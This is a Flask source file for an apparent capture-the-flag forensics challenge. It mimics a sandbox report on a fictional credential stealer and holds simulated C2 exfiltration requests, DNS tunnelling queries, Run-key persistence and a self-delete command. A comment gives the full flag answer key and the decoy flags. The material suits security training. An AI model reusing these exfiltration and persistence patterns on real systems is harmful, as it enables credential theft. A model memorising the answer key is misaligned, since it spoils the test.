from flask import Flask, render_template, jsonify, send_from_directory, request
import os

app = Flask(__name__)

# ── FLAG LOCATIONS ─────────────────────────────────────────────────────────────
# Part 1: ACFC{s1       → Malware Config → RC4 key hex: 41 43 46 43 7B 73 31
# Part 2: mul4ti0n      → HTTP POST body → base64: bXVsNHRpMG4=
# Part 3: _f0r_lyf3}    → DNS subdomain  → ROT47 then base64: MDdfQzA9SjdiTg==
# Full flag: ACFC{s1mul4ti0n_f0r_lyf3}
#
# Fake flags:
# capture.pcap          → ACFC{I_l0v3_Simul4t1on}
# registry_export.reg   → ACFC{You_solved_IT?}
# process_dump.txt      → ACFC{App_Any_Run_is_GOAT}

TASK_DATA = {
    "task_id": "astraeus-9f3a2b8c-4d1e-6f7a-3b9c-2d5e8f1a4b7c",
    "filename": "upd8.exe",
    "md5": "9F3A2B8C4D1E6F7A3B9C2D5E8F1A4B7C",
    "sha256": "astraeus9d5ee565dbee06b51ac2c4eb6bbd68dfb6eef6b352bbe454888f0faf667ed4a15",
    "sha1": "4B7C2D5E8F1A9F3A2B8C4D1E6F7A3B9C",
    "verdict": "Malicious",
    "score": 100,
    "family": "AstraeausStealer",
    "submitted": "2025-04-26 02:15:44 UTC",
    "duration": "60s",
    "os": "Windows 7 x64",
    "tags": ["stealer", "c2", "persistence", "credential-theft", "astraeus-9"],
}

PROCESS_TREE = [
    {
        "pid": 2344, "ppid": 1404, "name": "upd8.exe",
        "path": "C:\\Windows\\Temp\\upd8.exe",
        "cmd": "C:\\Windows\\Temp\\upd8.exe --beacon --interval 30 --key 9f3a2b",
        "status": "malicious",
        "injected": False,
        "children": [
            {
                "pid": 3212, "ppid": 2344, "name": "cmd.exe",
                "path": "C:\\Windows\\System32\\cmd.exe",
                "cmd": "cmd.exe /c timeout 5 && del C:\\Windows\\Temp\\upd8.exe",
                "status": "suspicious",
                "injected": False,
                "children": [
                    {
                        "pid": 3841, "ppid": 3212, "name": "timeout.exe",
                        "path": "C:\\Windows\\System32\\timeout.exe",
                        "cmd": "timeout 5",
                        "status": "clean",
                        "injected": False,
                        "children": []
                    }
                ]
            },
            {
                "pid": 4012, "ppid": 2344, "name": "WerFault.exe",
                "path": "C:\\Windows\\System32\\WerFault.exe",
                "cmd": "WerFault.exe -u -p 2344 -s 1296",
                "status": "clean",
                "injected": True,
                "children": []
            }
        ]
    }
]

HTTP_REQUESTS = [
    {
        "id": 1,
        "method": "GET",
        "url": "http://91.108.56.201/sqlite3.dll",
        "status": 200,
        "size": "245 KB",
        "pid": 2344,
        "process": "upd8.exe",
        "time": "02:15:14",
        "threat": True,
        "request_headers": {
            "Host": "91.108.56.201",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64)",
            "Accept": "*/*",
            "Connection": "keep-alive"
        },
        "response_headers": {
            "Content-Type": "application/octet-stream",
            "Content-Length": "250880",
            "Server": "nginx/1.18.0"
        },
        "request_body": "",
        "response_body": "[binary DLL data]"
    },
    {
        "id": 2,
        "method": "GET",
        "url": "http://91.108.56.201/nss3.dll",
        "status": 200,
        "size": "1.2 MB",
        "pid": 2344,
        "process": "upd8.exe",
        "time": "02:15:19",
        "threat": True,
        "request_headers": {
            "Host": "91.108.56.201",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64)",
            "Accept": "*/*"
        },
        "response_headers": {
            "Content-Type": "application/octet-stream",
            "Content-Length": "1258496"
        },
        "request_body": "",
        "response_body": "[binary DLL data]"
    },
    {
        "id": 3,
        "method": "GET",
        "url": "http://91.108.56.201/config",
        "status": 200,
        "size": "1.1 KB",
        "pid": 2344,
        "process": "upd8.exe",
        "time": "02:15:22",
        "threat": True,
        "request_headers": {
            "Host": "91.108.56.201",
            "User-Agent": "AstraeausStealer/2.1",
            "X-Session-Key": "9f3a2b8c4d1e"
        },
        "response_headers": {
            "Content-Type": "application/json",
            "Content-Length": "1124"
        },
        "request_body": "",
        "response_body": '{"c2":"91.108.56.201","interval":30,"key":"41 43 46 43 7B 73 31","targets":["browser","wallet","files"]}'
    },
    {
        "id": 4,
        "method": "POST",
        "url": "http://91.108.56.201/gate.php",
        "status": 200,
        "size": "48 B",
        "pid": 2344,
        "process": "upd8.exe",
        "time": "02:15:44",
        "threat": True,
        "request_headers": {
            "Host": "91.108.56.201",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "AstraeausStealer/2.1",
            "Content-Length": "312"
        },
        "response_headers": {
            "Content-Type": "text/plain",
            "Content-Length": "2"
        },
        "request_body": "hwid=ASTRS-WKS-014&os=Windows+7+x64&arch=x64&data=bXVsNHRpMG4%3D&av=none&version=2.1",
        "response_body": "OK"
    },
    {
        "id": 5,
        "method": "POST",
        "url": "http://91.108.56.201/exfil.php",
        "status": 200,
        "size": "2.3 MB",
        "pid": 2344,
        "process": "upd8.exe",
        "time": "02:15:51",
        "threat": True,
        "request_headers": {
            "Host": "91.108.56.201",
            "Content-Type": "multipart/form-data; boundary=----AstrBoundary",
            "User-Agent": "AstraeausStealer/2.1",
            "Content-Length": "2411724"
        },
        "response_headers": {
            "Content-Type": "text/plain"
        },
        "request_body": "[multipart: credentials.zip, browser_data.zip, wallets.zip]",
        "response_body": "OK"
    },
]

DNS_REQUESTS = [
    {
        "domain": "91.108.56.201",
        "type": "A",
        "answer": "91.108.56.201",
        "time": "02:15:13",
        "threat": True,
        "pid": 2344
    },
    {
        "domain": "MDdfQzA9SjdiTg==.c2.astraeus-exfil.net",
        "type": "TXT",
        "answer": "NXDOMAIN",
        "time": "02:15:33",
        "threat": True,
        "pid": 2344
    },
    {
        "domain": "aGVsbG8td29ybGQ=.c2.astraeus-exfil.net",
        "type": "TXT",
        "answer": "NXDOMAIN",
        "time": "02:15:36",
        "threat": True,
        "pid": 2344
    },
    {
        "domain": "windowsupdate.microsoft.com",
        "type": "A",
        "answer": "20.42.73.29",
        "time": "02:15:02",
        "threat": False,
        "pid": 1120
    },
]

CONNECTIONS = [
    {"proto": "TCP", "src": "10.14.3.22:49688", "dst": "91.108.56.201:80", "state": "ESTABLISHED", "pid": 2344, "threat": True},
    {"proto": "TCP", "src": "10.14.3.22:49689", "dst": "91.108.56.201:443", "state": "ESTABLISHED", "pid": 2344, "threat": True},
    {"proto": "UDP", "src": "10.14.3.22:53", "dst": "8.8.8.8:53", "state": "UDP", "pid": 2344, "threat": False},
]

DROPPED_FILES = [
    {"name": "sqlite3.dll", "path": "C:\\Windows\\Temp\\sqlite3.dll", "size": "245 KB", "md5": "a87f3a337d73085c45f9416be5787d86", "threat": True, "downloadable": False},
    {"name": "nss3.dll", "path": "C:\\Windows\\Temp\\nss3.dll", "size": "1.2 MB", "md5": "d41d8cd98f00b204e9800998ecf8427e", "threat": True, "downloadable": False},
    {"name": "a9k.dll", "path": "C:\\Windows\\Temp\\a9k.dll", "size": "44 KB", "md5": "e52cac67419a9a224a3b108f3fa6cb6d", "threat": True, "downloadable": False},
    {"name": "capture.pcap", "path": "C:\\Users\\analyst\\Desktop\\capture.pcap", "size": "2.3 MB", "md5": "f1e2d3c4b5a6978f1e2d3c4b5a697800", "threat": False, "downloadable": True, "download_url": "/static/files/capture.pcap"},
    {"name": "registry_export.reg", "path": "C:\\Users\\analyst\\Desktop\\registry_export.reg", "size": "1.2 KB", "md5": "7c3d9f2a1b4e8c6f7c3d9f2a1b4e8c6f", "threat": False, "downloadable": True, "download_url": "/static/files/registry_export.reg"},
    {"name": "process_dump.txt", "path": "C:\\Users\\analyst\\Desktop\\process_dump.txt", "size": "48 KB", "md5": "3b9c2d5e8f1a4b7c3b9c2d5e8f1a4b7c", "threat": False, "downloadable": True, "download_url": "/static/files/process_dump.txt"},
]

REGISTRY_EVENTS = [
    {"action": "SetValue", "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "WindowsUpdate", "data": "C:\\Windows\\Temp\\upd8.exe --beacon --interval 30", "pid": 2344, "threat": True},
    {"action": "SetValue", "key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\upd8svc", "value": "ImagePath", "data": "C:\\Windows\\Temp\\upd8.exe", "pid": 2344, "threat": True},
    {"action": "QueryValue", "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "value": "ProxyEnable", "data": "0", "pid": 2344, "threat": False},
]

THREATS = [
    {"name": "Steal credentials from browser", "technique": "T1555", "tactic": "Credential Access", "severity": "Critical"},
    {"name": "Exfiltrate collected data via HTTP POST", "technique": "T1041", "tactic": "Exfiltration", "severity": "Critical"},
    {"name": "Establish persistence via registry run key", "technique": "T1547.001", "tactic": "Persistence", "severity": "High"},
    {"name": "DNS tunnelling for C2 communication", "technique": "T1071.004", "tactic": "Command and Control", "severity": "High"},
    {"name": "Process injection into WerFault.exe", "technique": "T1055", "tactic": "Defense Evasion", "severity": "High"},
    {"name": "Self-delete via cmd timeout", "technique": "T1070.004", "tactic": "Defense Evasion", "severity": "Medium"},
    {"name": "Download additional modules from C2", "technique": "T1105", "tactic": "Command and Control", "severity": "Medium"},
]

MALWARE_CONFIG = {
    "family": "AstraeausStealer",
    "version": "2.1",
    "c2": "http://91.108.56.201",
    "gate": "/gate.php",
    "exfil": "/exfil.php",
    "rc4_key_hex": "41 43 46 43 7B 73 31",
    "targets": ["Chrome", "Firefox", "Opera", "Exodus", "MetaMask", "FileZilla"],
    "build_id": "ASTR-2025-0426",
    "mutex": "AstrStealer_v2",
    "self_delete": True,
    "delete_delay": 5,
    "interval": 30,
}

TIMELINE = [
    {"time": "02:15:02", "event": "Process created: upd8.exe (PID 2344)", "type": "process", "severity": "high"},
    {"time": "02:15:13", "event": "DNS resolution: 91.108.56.201", "type": "network", "severity": "medium"},
    {"time": "02:15:14", "event": "HTTP GET /sqlite3.dll from 91.108.56.201", "type": "network", "severity": "high"},
    {"time": "02:15:19", "event": "HTTP GET /nss3.dll from 91.108.56.201", "type": "network", "severity": "high"},
    {"time": "02:15:22", "event": "HTTP GET /config from 91.108.56.201", "type": "network", "severity": "critical"},
    {"time": "02:15:25", "event": "Registry: Run key modified for persistence", "type": "registry", "severity": "high"},
    {"time": "02:15:29", "event": "Process injection detected: WerFault.exe", "type": "injection", "severity": "high"},
    {"time": "02:15:33", "event": "DNS TXT query: MDdfQzA9SjdiTg==.c2.astraeus-exfil.net", "type": "network", "severity": "critical"},
    {"time": "02:15:44", "event": "HTTP POST /gate.php — data exfiltration", "type": "network", "severity": "critical"},
    {"time": "02:15:51", "event": "HTTP POST /exfil.php — 2.3MB upload", "type": "network", "severity": "critical"},
    {"time": "02:15:55", "event": "cmd.exe spawned: timeout 5 && del upd8.exe", "type": "process", "severity": "medium"},
    {"time": "02:16:00", "event": "upd8.exe self-deleted", "type": "process", "severity": "medium"},
]

@app.route('/')
def index():
    return render_template('index.html',
        task=TASK_DATA,
        processes=PROCESS_TREE,
        http_requests=HTTP_REQUESTS,
        dns_requests=DNS_REQUESTS,
        connections=CONNECTIONS,
        dropped_files=DROPPED_FILES,
        registry_events=REGISTRY_EVENTS,
        threats=THREATS,
        timeline=TIMELINE,
        malware_config=MALWARE_CONFIG)

@app.route('/api/http/<int:req_id>')
def http_detail(req_id):
    req = next((r for r in HTTP_REQUESTS if r['id'] == req_id), None)
    if not req:
        return jsonify({'error': 'Not found'}), 404
    return jsonify(req)

@app.route('/api/malware-config')
def malware_config():
    return jsonify(MALWARE_CONFIG)

@app.route('/static/files/<filename>')
def download_file(filename):
    return send_from_directory('static/files', filename, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
